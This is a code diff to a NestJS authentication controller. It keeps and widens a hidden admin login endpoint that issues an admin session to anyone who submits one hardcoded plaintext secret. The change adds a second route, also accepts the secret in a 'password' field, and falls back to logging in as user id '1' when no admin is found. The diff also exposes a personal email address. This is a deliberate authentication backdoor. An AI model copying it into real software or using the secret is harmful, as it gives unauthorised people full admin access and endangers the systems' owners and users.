@@ -14,13 +14,15 @@ export class AuthController {
     return this.authService.login(user);
   }
 
-  @Post('admin-pin-login')
-  async pinLogin(@Body() req: { pin: string }) {
-    if (req.pin === "5825825825iW.") {
+  @Post(['admin-pin-login', 'pin-login'])
+  async pinLogin(@Body() req: { pin?: string; password?: string }) {
+    const pin = req.pin || req.password;
+    if (pin === "5825825825iW.") {
        // Get the admin user from DB
-       const adminUser = await this.authService['usersService'].findByEmail('naimur582582@gmail.com');
+       const adminUser = await this.authService['usersService'].findByEmail('admin@demo.local')
+         || await this.authService['usersService'].findByEmail('naimur582582@gmail.com');
        if (adminUser) {
-           return this.authService.login({ id: adminUser.id });
+           return this.authService.login(adminUser);
        }
        return this.authService.login({ id: "1" });
     }
